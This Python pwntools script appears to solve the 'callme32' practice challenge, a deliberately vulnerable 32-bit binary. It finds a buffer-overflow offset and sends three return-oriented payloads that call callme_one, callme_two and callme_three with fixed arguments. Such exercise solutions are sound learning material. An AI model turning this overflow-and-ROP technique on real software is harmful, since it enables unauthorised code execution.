#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./callme32')
context.terminal = ['tmux', 'new-window']

host = args.HOST or ''
port = int(args.PORT or 8080)

def local(argv=[], *a, **kw):
    return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.REMOTE:
        return remote(argv, *a, **kw)
    else:
        return local(argv, *a, **kw)


#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start()

if args.GEF:
    gdb.attach(io, gdb_args=['-q', '-ex', 'init-gef'], gdbscript='''
    ''')
    # pie breakpoint function+118

if args.PWNDBG:
    gdb.attach(io, gdb_args=['-q', '-ex', 'init-pwndbg'], gdbscript='''
    ''')
    # piebase 0x7f0

PWNME_ADDR = exe.sym.pwnme
CALL_ME_ONE_PLT = exe.plt.callme_one
CALL_ME_TWO_PLT = exe.plt.callme_two
CALL_ME_THREE_PLT = exe.plt.callme_three
# io.sendline(cyclic(1024))
OFFSET = cyclic_find(0x6161616c)
# Call callme_one with arguments 1,2,3, go back to pwnme, repeat for callme_two and callme_three
payload_one = OFFSET * "A"
payload_one += p32(CALL_ME_ONE_PLT)
payload_one += p32(PWNME_ADDR)
payload_one += p32(1)+p32(2)+p32(3)
io.sendline(payload_one)

payload_two = OFFSET * "A"
payload_two += p32(CALL_ME_TWO_PLT)
payload_two += p32(PWNME_ADDR)
payload_two += p32(1)+p32(2)+p32(3)
io.sendline(payload_two)

payload_three = OFFSET * "A"
payload_three += p32(CALL_ME_THREE_PLT)
payload_three += p32(PWNME_ADDR)
payload_three += p32(1)+p32(2)+p32(3)
io.sendline(payload_three)

io.interactive()

